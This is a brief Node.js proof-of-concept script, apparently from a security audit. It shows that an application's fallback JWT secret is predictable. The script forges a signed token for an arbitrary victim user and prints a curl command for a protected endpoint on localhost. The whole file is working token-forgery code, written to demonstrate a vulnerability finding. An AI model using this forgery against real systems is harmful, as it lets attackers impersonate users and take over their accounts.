/**
 * PoC: CRITICAL - Predictable JWT secret fallback enables token forgery.
 * Usage:
 *   node poc/critical_jwt_forgery.js
 * Optional env:
 *   TARGET_URL=http://localhost:3000
 *   FORGED_SUB=victim-user-id
 *   FORGED_EMAIL=victim@example.com
 */

const jwt = require("jsonwebtoken");

const targetUrl = process.env.TARGET_URL || "http://localhost:3000";
const forgedSub = process.env.FORGED_SUB || "victim-user-id";
const forgedEmail = process.env.FORGED_EMAIL || "victim@example.com";

// Known weak default from finding
const weakSecret = "dev-access-secret";

const token = jwt.sign(
  { sub: forgedSub, email: forgedEmail, role: "user" },
  weakSecret,
  { expiresIn: 3600, algorithm: "HS256" }
);

console.log("[+] Forged JWT generated:");
console.log(token);
console.log("");
console.log("[+] Test against protected endpoint:");
console.log(
  `curl -H "Authorization: Bearer ${token}" ${targetUrl}/me`
);
